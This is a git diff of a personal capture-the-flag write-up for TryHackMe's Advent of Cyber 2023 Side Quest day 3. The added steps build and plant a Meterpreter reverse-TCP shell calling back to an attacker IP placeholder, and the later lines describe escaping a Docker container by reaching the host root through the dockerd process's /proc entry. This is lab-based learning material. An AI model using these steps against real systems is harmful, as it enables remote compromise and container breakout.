@@ -1,4 +1,4 @@
-# Advent-Of-Cyber-2023-Side-Quest Through=
+# Advent-Of-Cyber-2023-Side-Quest Through
 
 Name: Advent-Of-Cyber-2023-Side-Quest
 Date:  
@@ -220,20 +220,49 @@ BEfore losing my mind and rabbitholing in dev week:
 -We can set permissions with `:call setfperm("/tmp/sh","rwxrwxrwx")`.
 -`:e /etc/shells` gives us `/usr/busybox/sh`.
 -It seems the 8065 port points to `/usr/frosty/sh`.
+# What we then need to do:
+-Create your payload using `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload.elf`.
+-Start your listener in `msfconsole` and use `payload/linux/x64/meterpreter/reverse_tcp`, then `set hosts YOUR_IP`.
+-ftp to 8075 and upload the payload.elf file.
+-telnet to 8095 to use nano to open the payload.elf file at /tmp/ftp/payload.elf and save to /usr/frosry/sh.
+-telnet to 8065 and you will now have a meterpreter session. Use sessions -i 1 to get the meterpreter prompt.
 ```
 
 She then creates a msfvenom shell and uploads via FTP
 ![](grepnomorerabbitholes.png)
 
-BatBato's solution was to upload Linux binaries  
+[BatBato](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day3#foothold)'s solution was to upload Linux binaries  
 ![](batosolutiontotheshellday3issue.png)
 
 ![](changeofname.png)
 
+Sometimes just doing what you are told is a good idea to get things done.
+![](weareinacontainer.png)
 
+Just because I am trying to develop stuff and hopeful find a bug in some application this year with Docker Containers I decide for the Docker Escape I would not use Writeups. The interesting part of this machine is there a lack of binaries for utility on this machine and there is no user other than `ubuntu`, but we are:
+![](butwearealreadyroot.png)
+and therefore:
+![](flag3day3.png)
+```ruby
+cat /proc/1/cgroup # No docker 
+ls sbin # has chroot
 ```
-:call setfperm("/tmp/ftp/sh","rwxrwxrwx")
+
+![](devrootrootroot.png)
+
+Added to my Archive repository as I did not have this:
+```bash
+ps | grep dockerd 
 ```
+
+As we have the process we can view the `/proc/`
+![](dockerd.png)
+
+Like so:
+![](proc1215root.png)
+
+`ls`-ing the host root directory: 
+![](finalday3flagandyeti.png)
 ## Post-Completion-Reflection  
 
 - The people that unknowingly contributed to my fast-track exposure to these topics are awesome!
